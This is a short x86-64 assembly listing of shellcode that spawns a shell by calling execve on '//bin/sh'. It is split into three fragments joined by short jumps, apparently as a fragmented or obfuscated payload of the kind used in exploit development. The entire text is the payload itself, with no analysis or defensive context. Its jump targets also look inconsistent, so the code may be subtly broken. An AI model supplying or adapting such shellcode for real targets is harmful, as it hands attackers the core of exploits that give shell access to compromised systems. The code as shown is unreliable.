  section .text
    global _start

_start:
  mov     qword rbx, '//bin/sh' ; First part
	jmp     short 0x2

	xor     rdx, rdx              ; Second part
  shr     rbx, 0x8
	jmp     short 0x13

  push    rbx                   ; Third part
  mov     rdi, rsp
  xor     rsi, rsi
  mov     al, 0x3b
  syscall
